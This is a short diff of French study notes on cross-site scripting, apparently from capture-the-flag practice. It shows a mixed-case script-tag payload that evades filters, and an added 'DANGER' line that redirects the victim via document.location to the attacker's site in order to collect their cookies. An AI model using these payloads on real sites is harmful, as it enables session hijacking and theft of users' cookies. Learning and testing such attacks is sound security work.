@@ -26,6 +26,10 @@ Pour plus de sécurité, il vaut mieux gérer les vérifications de formulaire d
 - <sCrIpT>alert(”lol”)</ScrIpt>
     ⇒ On affiche bien lol en alerte
 
+DANGER :
+on envoie : document.location="http://mon-site"
+Et on peut renvoyer l'utilisateur sur notre propre site tout en recuperant tous ses cookies par exemple.
+
 BUG CTF:  
 - a en commentaire
 - e en name sans commentaire
